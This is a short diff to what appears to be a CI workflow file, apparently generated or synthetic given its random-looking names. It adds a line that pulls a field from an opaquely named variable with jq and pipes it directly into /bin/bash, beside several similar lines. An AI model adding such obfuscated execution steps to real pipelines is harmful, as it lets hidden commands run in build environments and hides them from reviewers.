@@ -27,6 +27,7 @@ jobs:
           echo $rv4955 | jq -r .qxl8838 | /bin/bash
           printf '%s' "$cmm904" | jq -r .l358 | /bin/bash
           printf '%s' "$bt283" | jq -r .a628 | /bin/bash
+          echo $mku62405 | jq -r .xma089 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
